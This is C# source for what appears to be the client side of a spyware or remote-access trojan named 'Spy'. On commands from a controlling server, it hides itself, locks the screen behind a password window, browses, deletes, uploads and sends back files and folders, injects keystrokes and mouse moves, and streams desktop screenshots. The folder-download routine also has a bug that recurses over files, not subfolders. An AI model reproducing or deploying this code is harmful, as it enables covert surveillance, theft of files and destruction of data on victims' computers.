using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Drawing;
using System.IO;
using Both;

namespace Spy
{
    public class Commends
    {
        public Server server;
        public UserAPI userAPI;
        private bool isConnect = false;
        public bool IsConnect
        {
            get
            {
                return isConnect;
            }
            private set
            {
                isConnect = value;
                Program.WriteLine(string.Format("The control {0}connect", (isConnect) ? "" : "dis"));
            }
        }
        public bool VolumeMute;
        public int VolumeLevel;

        //Load
        public Commends()
        {
            userAPI = new UserAPI();
            VolumeMute = userAPI.readVolume.Mute;
            VolumeLevel = userAPI.readVolume.Level;
        }

        //Big
        public void ReadServer(object sender, byte[] array)
        {
            Chat chat = (Chat)sender;
            ByteArray commend = new ByteArray(array);
            string hard = commend.ReadString();

            switch (hard)
            {
                case "P"://Print
                    {
                        string text = commend.ReadString();
                        Program.WriteLine(text);
                    }
                    break;
                case "PP"://~Ping
                    {
                        Ping_Text = commend.ReadString();
                        Ping_Title = commend.ReadString();
                        Thread th = new Thread(Ping);
                        th.Start();
                    }
                    break;
                case "E"://Exit
                    {
                        Program.Exit();
                    }
                    break;
                case "ED"://~Disconnect
                    {
                        char GoodNot = commend.ReadChar();
                        if (GoodNot == 'F')
                        {
                            IsConnect = false;
                        }
                        chat.Stop();
                    }
                    break;
                case "H"://Hide
                    {
                        int ty = commend.ReadInt();
                        HideProgram.Look = (ty == 1);
                    }
                    break;
                case "S"://Stop
                    {
                        formStop = new FormStopPassword();
                        char ty = commend.ReadChar();
                        switch (ty)
                        {
                            case 'N'://Normal
                                {
                                    formStop.StartWindow();
                                }
                                break;
                            case 'P'://Password
                                {
                                    string Password = commend.ReadString();
                                    formStop.StartWindow(Password);
                                }
                                break;
                            case 'T'://Timer
                                {
                                    int Time = commend.ReadInt();
                                    formStop.StartWindow(Time);
                                }
                                break;
                        }

                        Stop.Start();
                    }
                    break;
                case "SC"://~Cancel
                    {
                        if (IsStop)
                        {
                            Stop.Abort();
                            Stop = null;
                        }
                    }
                    break;
                case "GD"://Get Directory
                    {
                        string folder = commend.ReadString();
                        ByteArray set = new ByteArray();
                        set.Write('S');
                        set.Write('D');
                        bool Exists = Directory.Exists(folder);
                        set.Write((Exists) ? 'T' : 'F');
                        if (Exists)
                        {
                            string[] folders = Directory.GetDirectories(folder);
                            set.Write(folders.Length);
                            foreach (var item in folders)
                            {
                                set.Write(item);
                            }
                            string[] files = Directory.GetFiles(folder);
                            set.Write(files.Length);
                            foreach (var item in files)
                            {
                                set.Write(item);
                            }
                        }
                        server.Write(set.Values);
                    }
                    break;
                case "F"://Files
                    {
                        char action = commend.ReadChar();
                        string[] folders = new string[commend.ReadInt()];
                        for (int i = 0; i < folders.Length; i++)
                        {
                            folders[i] = commend.ReadString();
                        }
                        string[] files = new string[commend.ReadInt()];
                        for (int i = 0; i < files.Length; i++)
                        {
                            files[i] = commend.ReadString();
                        }
                        switch (action)
                        {
                            case 'D'://Delet
                                {
                                    foreach (var item in files)
                                    {
                                        if (File.Exists(item))
                                        {
                                            try
                                            {
                                                File.Delete(item);
                                            }
                                            catch { }
                                        }
                                    }
                                    foreach (var item in folders)
                                    {
                                        try
                                        {
                                            Both.MyClass.Folders.DeletFolder(item);
                                        }
                                        catch { }
                                    }
                                }
                                break;
                            case 'G'://Get - Dounlod
                                {
                                    foreach (var item in files)
                                    {
                                        if (File.Exists(item))
                                        {
                                            try
                                            {
                                                Download(item);
                                            }
                                            catch { }
                                        }
                                    }
                                    foreach (var item in folders)
                                    {
                                        try
                                        {
                                            DownloadFolder(item);
                                        }
                                        catch { }
                                    }
                                }
                                break;
                            case 'C'://Copy
                                {
                                    string to = commend.ReadString();
                                    if (Directory.Exists(to))
                                    {
                                        foreach (var item in files)
                                        {
                                            if (File.Exists(item))
                                            {
                                                try
                                                {
                                                    string name = (new FileInfo(item)).Name;
                                                    File.Copy(item, to + @"\" + name);
                                                }
                                                catch { }
                                            }
                                        }
                                        foreach (var item in folders)
                                        {
                                            try
                                            {
                                                Both.MyClass.Folders.CopyFolder(item, to);
                                            }
                                            catch { }
                                        }
                                    }
                                }
                                break;
                        }
                    }
                    break;
                case "AN"://Add ~New Folder
                    {
                        string Folder = commend.ReadString();
                        NewFolder(Folder);
                    }
                    break;
                case "AS"://~Set Files
                    {
                        string Folder = commend.ReadString();
                        int Length = commend.ReadInt();
                        for (int i = 0; i < Length; i++)
                        {
                            UploadFolder(Folder, commend);
                        }
                        Length = commend.ReadInt();
                        for (int i = 0; i < Length; i++)
                        {
                            Upload(Folder, commend);
                        }
                    }
                    break;
                case "KK"://KeepBord ~Key
                    {
                        int i = commend.ReadInt();
                        Keys key = (Keys)i;
                        ReadKeyNotReturn = true;
                        UserAPI.SetKeys(key);
                    }
                    break;
                case "KM"://~set Mouse
                    {
                        int x = commend.ReadInt();
                        int y = commend.ReadInt();
                        UserAPI.SetMouse(x, y);
                    }
                    break;
                case "VM"://Volume ~Mute
                    {
                        int i = commend.ReadInt();
                        bool NewMute = false;
                        if (i == 1)
                        {
                            NewMute = true;
                        }
                        else if (i == 2)
                        {
                            NewMute = !userAPI.readVolume.Mute;
                        }
                        userAPI.readVolume.Mute = NewMute;
                    }
                    break;
                case "VL"://~Level
                    {
                        int i = commend.ReadInt();
                        userAPI.readVolume.Level = i;
                    }
                    break;
                case "L"://Loop()
                    {
                        Loop(true);
                    }
                    break;
            }
        }
        public void LoadServer(object sender)
        {
            Chat chat = (Chat)sender;
            ByteArray byteArray = new ByteArray();
            byteArray.Write("SC");
            if (IsConnect)
            {
                byteArray.Write('F');
            }
            else
            {
                IsConnect = true;
                byteArray.Write('T');
                byteArray.Write(Net.NameComputer);
                byteArray.Write(DateTime.Now);
                byteArray.Write((HideProgram.Look) ? 'T' : 'F');
                byteArray.Write((VolumeMute) ? 'T' : 'F');
                byteArray.Write(VolumeLevel);
            }
            chat.Write(byteArray.Values);
        }
        public void Loop(bool FromServer)
        {
            if (!isConnect)
                return;
            Server chat = server;
            ByteArray byteArray = new ByteArray();
            byteArray.Write("L");//Loop

            //Window Screan
            Image image = UserAPI.ScreenshotDesktop();
            MemoryStream memoryStream = new MemoryStream();
            image.Save(memoryStream, System.Drawing.Imaging.ImageFormat.Jpeg);
            byte[] bytes = memoryStream.ToArray();
            byteArray.Write(bytes, true);
            
            //Volume
            if (VolumeMute != userAPI.readVolume.Mute)
            {
                ByteArray VolumeMuteToBytes = new ByteArray();
                VolumeMute = userAPI.readVolume.Mute;
                VolumeLevel = userAPI.readVolume.Level;
                VolumeMuteToBytes.Write("SV");
                VolumeMuteToBytes.Write((VolumeMute) ? 'T' : 'F');
                chat.Write(VolumeMuteToBytes.Values);
            }
            if (FromServer)
            {
                ByteArray byteArrayMore = new ByteArray();
                byteArrayMore.Write("SVA");
                byteArrayMore.Write(VolumeLevel);
                byteArray.Write(userAPI.readVolume.Volume);
                chat.Write(byteArrayMore.Values);
            }

            //End
            chat.Write(byteArray.Values);
        }

        //P
        public string Ping_Text, Ping_Title;
        public void Ping()
        {
            MessageBox.Show(Ping_Text, Ping_Title);
        }

        //S
        public bool IsStop = false;
        public Thread Stop;
        private FormStopPassword formStop;
        public void ShowStopWindow()
        {
            formStop.ShowDialog();
        }

        //Files
        public void Download(string file, string FolderTitle = "")
        {
            if (File.Exists(file))
            {
                ByteArray byteArray = new ByteArray();
                byteArray.Write("F");
                string title = FolderTitle + @"\" + (new FileInfo(file).Name);
                byteArray.Write(title);
                byte[] date = File.ReadAllBytes(file);
                byteArray.Write(date, true);
                server.Write(byteArray.Values);
            }
        }
        public void DownloadFolder(string Folder, string FolderTitle = "")
        {
            if (Directory.Exists(Folder))
            {
                try
                {
                    FolderTitle += @"\" + new DirectoryInfo(Folder).Name;
                    string[] files = Directory.GetFiles(Folder);
                    foreach (var item in files)
                    {
                        Download(item, FolderTitle);
                    }
                    string[] folders = Directory.GetDirectories(Folder);
                    foreach (var item in files)
                    {
                        DownloadFolder(item, FolderTitle);
                    }
                }
                catch { }
            }
        }

        public void NewFolder(string folder)
        {
            try
            {
                Directory.CreateDirectory(folder);
            }
            catch { }
        }
        public void Upload(string folder, ByteArray byteArray)
        {
            string Name = byteArray.ReadString();
            byte[] bytes = byteArray.ReadByteArray();
            try
            {
                string url = folder + @"\" + Name;
                if (!File.Exists(url))
                    File.AppendText(url);
                File.WriteAllBytes(url, bytes);
            }
            catch { }
        }
        public void UploadFolder(string folder, ByteArray byteArray)
        {
            string Name = byteArray.ReadString();
            folder = folder + @"\" + Name;
            NewFolder(folder);
            int Length = byteArray.ReadInt();
            for (int i = 0; i < Length; i++)
            {
                UploadFolder(folder, byteArray);
            }
            Length = byteArray.ReadInt();
            for (int i = 0; i < Length; i++)
            {
                Upload(folder, byteArray);
            }
        }

        //KeepBord
        public bool ReadKeyNotReturn = false;
    }
}
